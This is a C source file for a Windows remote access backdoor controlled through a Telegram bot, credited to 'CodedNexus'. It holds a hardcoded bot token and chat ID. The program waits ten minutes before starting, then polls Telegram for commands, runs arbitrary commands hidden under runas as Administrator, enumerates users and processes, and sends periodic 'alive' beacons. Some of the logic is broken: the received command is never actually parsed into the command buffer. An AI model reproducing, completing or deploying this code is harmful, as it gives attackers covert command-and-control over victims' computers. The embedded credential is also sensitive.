
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <curl/curl.h>
#include <psapi.h>
#include <userenv.h>
#include <time.h>

#define TOKEN "8189296418:AAExUFzaL9z2BYQRvoNxOjWJtGrgu3N_sWo"
#define CHAT_ID "1562460007"

/*
 * Copyright (c) 2025, CodedNexus. All rights reserved.
 * This code is provided "as is" without warranty of any kind.
 */

PROCESS_INFORMATION running_process = {0};
int alive_interval = 2; // Default to 2 minutes for alive signal

void execute_command(char *command) {
    char full_command[1024];
    snprintf(full_command, sizeof(full_command), "runas /user:Administrator \"%s\"", command);

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&running_process, sizeof(running_process));

    if (CreateProcess(NULL, full_command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &running_process)) {
        WaitForSingleObject(running_process.hProcess, INFINITE);
        CloseHandle(running_process.hProcess);
        CloseHandle(running_process.hThread);
    }
}

size_t write_callback(void *contents, size_t size, size_t nmemb, char *output) {
    size_t total_size = size * nmemb;
    strncat(output, contents, total_size);
    return total_size;
}

void send_telegram_message(const char *message) {
    CURL *curl;
    CURLcode res;
    char url[512];
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", TOKEN, CHAT_ID, message);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

void get_telegram_updates() {
    CURL *curl;
    CURLcode res;
    char url[512];
    char read_buffer[1024] = {0};

    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/getUpdates", TOKEN);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    if (strlen(read_buffer) > 0) {
        send_telegram_message("Command received! ------Made By @CodedNexus+------");
    }
}

void stop_running_command() {
    if (running_process.hProcess != NULL) {
        TerminateProcess(running_process.hProcess, 1);
        CloseHandle(running_process.hProcess);
        CloseHandle(running_process.hThread);
        send_telegram_message("Running command stopped. ------Made By @CodedNexus+------");
    }
}

void get_user_info() {
    DWORD sessionId;
    HANDLE hToken;
    TOKEN_INFORMATION_CLASS infoClass = TokenUser;
    PTOKEN_USER tokenUser;
    DWORD length;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        GetTokenInformation(hToken, infoClass, NULL, 0, &length);
        tokenUser = (PTOKEN_USER)malloc(length);
        if (GetTokenInformation(hToken, infoClass, tokenUser, length, &length)) {
            SID_NAME_USE sidType;
            char username[256];
            char domain[256];
            DWORD usernameLen = sizeof(username);
            DWORD domainLen = sizeof(domain);

            if (LookupAccountSid(NULL, tokenUser->User.Sid, username, &usernameLen, domain, &domainLen, &sidType)) {
                // Output username and domain (can be logged or used as needed)
            }
        }
        CloseHandle(hToken);
    }

    free(tokenUser);
}

void list_processes() {
    DWORD processes[1024];
    DWORD cbNeeded;
    unsigned int i;

    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        unsigned int processCount = cbNeeded / sizeof(DWORD);
        for (i = 0; i < processCount; i++) {
            DWORD processId = processes[i];
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            if (hProcess) {
                char processName[MAX_PATH];
                HMODULE hMod;
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleFileNameEx(hProcess, hMod, processName, sizeof(processName) / sizeof(char));
                    // Output process name (could log or check)
                }
                CloseHandle(hProcess);
            }
        }
    }
}

void send_alive_signal() {
    char message[256];
    snprintf(message, sizeof(message), "I am alive! ------Made By @CodedNexus+------");
    send_telegram_message(message);
}

void handle_alive_command(char *command) {
    int minutes = 0;
    if (sscanf(command, "/alive %d", &minutes) == 1) {
        alive_interval = minutes;
        send_telegram_message("Alive interval updated. ------Made By @CodedNexus+------");
    } else {
        send_telegram_message("Invalid /alive command. Please use '/alive <minutes>'. ------Made By @CodedNexus+------");
    }
}

int main() {
    char command[256];
    time_t last_alive_time = time(NULL);

    // Run the program and wait for 10 minutes
    Sleep(600000);  // Wait for 10 minutes (600,000 milliseconds)

    while (1) {
        get_telegram_updates();

        if (strlen(command) > 0) {
            if (strcmp(command, "stop") == 0) {
                stop_running_command();
            } else if (strcmp(command, "/user") == 0) {
                get_user_info();
                list_processes();
                send_telegram_message("User info and processes listed. ------Made By @CodedNexus+------");
            } else if (strcmp(command, "/exit") == 0) {
                send_telegram_message("Application stopped. ------Made By @CodedNexus+------");
                exit(0);
            } else if (strncmp(command, "/alive", 6) == 0) {
                handle_alive_command(command);
            } else {
                execute_command(command);
            }
        }

        // Check if it's time to send an alive signal
        time_t current_time = time(NULL);
        if (difftime(current_time, last_alive_time) >= alive_interval * 60) {
            send_alive_signal();
            last_alive_time = current_time;
        }

        Sleep(500); // 0.5 second sleep
    }

    return 0;
}
